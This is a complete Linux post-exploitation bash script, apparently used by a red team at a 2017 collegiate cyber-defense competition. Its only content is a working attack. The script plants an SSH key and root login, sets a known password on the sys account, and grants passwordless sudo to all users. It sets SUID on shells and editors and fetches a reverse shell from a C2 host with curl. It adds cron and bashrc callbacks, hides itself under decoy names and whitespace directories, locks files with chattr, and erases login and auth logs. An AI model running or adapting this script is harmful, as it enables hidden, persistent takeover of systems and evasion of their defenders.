# DO NOT RUN THIS SCRIPT ON YOUR SYSTEM
# This is a script deployed by the WRCCDC Red Team during the 2017 Regional Event
#!/usr/bin/env bash
set +x

# ===== DEFINITIONS ======
C2_IP=172.31.35.44
C2_PORT=5555
#C2_IP=52.43.3.214
SHARED_PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCutP0PLd7ktP96z2OPTCjvLSq1XxaxndU8Gi83vKdjtKtJh3GuDXulFRZYHBogO+zoolte59lzWMu0qFkLq1TVGRoYohfmCsguQI6kcXBfjkO43ZOydbLEn2AhrouOZ1BjIJIwRqDVAeoDe2nX+0Jhq1kvKzYsh2WJANHuBWEKzopsaryWYnXu9ESyYXylFioQbyoeLT9gdZ2e7N9dx+d0ntsQN9zjBVUh/5CrZkwM91tiM24D5NZ+/2jT2ypXiVFNSV1hxKZLQJgHqbUh0qvwXh3gcSLkjoZltIxxMi0Ylz5dfpI54ZJviczeyeiDa9qe5dW6C0KOKEtX+g87mg9b"
SHARED_PASSWD="theallegedparadigm"
DOWNLOAD_DIR="/etc/udev/conf.d/  "
DECOY_NAME="[kworker/2:0]"
# ========================

clear_logins() {
  cat /dev/null > /var/log/wtmp*
  cat /dev/null > /var/log/btmp*
}

my_chattr() {
  if [ -f $(which chattr) ]; then
    echo $(which chattr)
  else
    echo /usr/bin/diff2
  fi
}

install_ssh_key() {

	if [ ! -d "/root/.ssh" ]; then
		mkdir /root/.ssh
	fi

  if [ ! -d "/home/sys" ]; then
    mkdir /home/sys
  fi

	declare -a files=("/root/.ssh/authorized_keys" "/root/.ssh/authorized_keys1" "/etc/ssh/authorized_keys" "/dev/.ssh/authorized_keys")

	for i in "${files[@]}";
	do
    xchattr=$(my_chattr)
 		$xchattr -i $i
   	echo $SHARED_PUBKEY >> $i
		reset_mtime $i
		$xchattr +i $i
	done
  $xchattr -i /etc/ssh/sshd_config
	echo 'AuthorizedKeysFile /etc/ssh/authorized_keys %h/.ssh/authorized_keys' >> /etc/ssh/sshd_config
  $xchattr +i /etc/ssh/sshd_config
} 

permit_root_login() { 
  xchattr=$(my_chattr)
	$xchattr -i /etc/ssh/sshd_config
	sed -i 's/^PermitRootLogin .*$/PermitRootLogin yes/' /etc/ssh/sshd_config
	sed -i 's/^PasswordAuthentication .*$/PasswordAuthentication yes/' /etc/ssh/sshd_config
	reset_mtime "/etc/ssh/sshd_config"
  service sshd reload
  $xchattr +i /etc/ssh/sshd_config
}

reset_mtime() { # takes a file name
	touch -r /etc/issue $1
}

get() { # takes a file name
  curl http://$C2_IP/$1 -s --create-dirs -o "/etc/udev/conf.d/  /$1"
  reset_mtime "/etc/udev/conf.d/  /$1"
}

enable_sys_user() {
	#pass=lol123 
  xchattr=$(my_chattr)
  $xchattr -i /etc/passwd
  $xchattr -i /etc/shadow
	sed -i -e 's/sys:\*:/sys:$6$OkgT6DOT$0fswsID8AwsBF35QHXQVmDLzYGT.pUtizYw2G9ZCe.o5pPk6HfdDazwdqFIE40muVqJ832z.p.6dATUDytSdV0:/g' /etc/shadow
	usermod -s /bin/sh sys
	usermod -s /bin/sh sys
  $xchattr +i /etc/passwd
  $xchattr +i /etc/shadow
  mkdir -p /dev/.ssh/
}

immutable_users() {
  xchattr=$(my_chattr)
  $xchattr +i /etc/passwd
  $xchattr +i /etc/shadow
}

drop_trixdoor() {
  # run server. Change binary name although won't help much
  # setsid ./trixd00rd -i eth0 -s 1 -b 5555 -c 172.31.35.44 -d -x
  get "trixd00rd"
  binname="[kworker]"
  mv '/etc/udev/conf.d/  /trixd00rd' "/etc/udev/conf.d/  /$binname"
  chmod +x "/etc/udev/conf.d/  /$binname"
  pushd '/etc/udev/conf.d/  '
  setsid ./$binname -i eth0 -s 1 -b 5555 $C2_IP -d -x
  popd
  # client command => ./trixd00r -h 172.31.8.127 -s 1 -p 5555
}

drop_rooty() {
  # run server. Change name of binary, ex [kauditd]
  get "rooty-release"
  binname="[bioset]"
  mv '/etc/udev/conf.d/  /rooty-release' "/etc/udev/conf.d/  /$binname"
  chmod +x "/etc/udev/conf.d/  /$binname"
  pushd '/etc/udev/conf.d/  '
  setsid "./$binname"
  popd
  # setsid ./rooty-release
  # client command => python client.py -i eth0 -d 172.31.8.127
}

everybody_gets_root() {
	echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
  xchattr=$(my_chattr)
  $xchattr -i /etc/passwd
  $xchattr -i /etc/shadow
	touch -r /etc/issue * /etc/passwd
	touch -r /etc/issue * /etc/sudoers
	groupadd admin

	for user in $(awk -F':' '{ print $1 }' /etc/passwd); do
		usermod -G admin -a $user
	done  
  $xchattr +i /etc/passwd
  $xchattr +i /etc/shadow
}

my_root_shell() {
  cp /bin/sh '/etc/udev/conf.d/  /st'
  chmod u+s '/etc/udev/conf.d/  /st'
}

suid_all_the_things() {
  declare -a files=("/bin/sh /bin/bash /bin/zsh $(which vim) $(which nano) $(which find)")

	for i in "${files[@]}"
	do
    chmod u+s $i
  done
}

obvious_revshell() {
  get "perl-revshell.pl"
  mv '/etc/udev/conf.d/  /perl-revshell.pl' '/etc/udev/conf.d/  /default'
  chmod u+s '/etc/udev/conf.d/  /default'
  chmod +x '/etc/udev/conf.d/  /default'
  pushd '/etc/udev/conf.d/  '
  setsid ./default $C2_IP 5555
  popd 
}

setup() {
  if [ ! -d '/etc/udev/conf.d/  /' ]; then
    mkdir -p '/etc/udev/conf.d/  '
  fi
}

clean_logs() {
  sed -ie '/groupadd/d' /var/log/auth.log /var/log/messages /var/log/secure
  sed -ie '/usermod/d' /var/log/auth.log /var/log/messages /var/log/secure
  sed -ie "/$C2_IP/d" /var/log/auth.log /var/log/messages /var/log/secure
  sed -ie '/passwd/d' /var/log/auth.log /var/log/messages /var/log/secure
  sed -ie '/Accepted password for sys/d' /var/log/auth.log /var/log/messages /var/log/secure
  sed -ie '/Accepted password for root/d' /var/log/auth.log /var/log/messages /var/log/secure
}

nochatrr() { 
  if [ -d $(which chattr) ]; then
    mv $(which chattr) /usr/bin/diff2
  fi
}

nokill() {
  if [ -d $(which kill) ]; then
    mv $(which kill) /bin/bzgrep2
  fi
}

so_much_cron() {
	for user in $(awk -F: '$3 > 500 {print $1}' /etc/passwd); do
    (crontab -l -u $user 2>/dev/null; echo "*/1 * * * * '/etc/udev/conf.d/  /default' $C2_IP $C2_PORT") | crontab -u $user -
	done  
  (crontab -l -u $user 2>/dev/null; echo "*/1 * * * * '/etc/udev/conf.d/  /default' $C2_IP $C2_PORT") | crontab -u root -
  (crontab -l -u $user 2>/dev/null; echo "*/1 * * * * '/etc/udev/conf.d/  /default' $C2_IP $C2_PORT") | crontab -u sys -
}

bashrc() {
	for user in $(awk -F: '$3 > 500 {print $1}' /etc/passwd); do
    home=$(grep $user /etc/passwd|cut -f6 -d":")
    echo "'/etc/udev/conf.d/  /default' $C2_IP $C2_PORT" >> $home/.bashrc
	done 

  echo "'/etc/udev/conf.d/  /default' $C2_IP $C2_PORT" >> /root/.bashrc
  echo "'/etc/udev/conf.d/  /default' $C2_IP $C2_PORT" >> /dev/.bashrc
  echo "'/etc/udev/conf.d/  /default' $C2_IP $C2_PORT" >> /etc/profile
  echo "'/etc/udev/conf.d/  /default' $C2_IP $C2_PORT" >> /etc/bash.bashrc
}

# Backdoor a binary (e.g bash)

partay() {
  setup
  suid_all_the_things
  everybody_gets_root
  my_root_shell
  enable_sys_user
  install_ssh_key
  permit_root_login
  obvious_revshell
  nokill
  immutable_users
  so_much_cron
  bashrc
  #drop_rooty
  #drop_trixdoor
  clear_logins
  clean_logs
}

partay
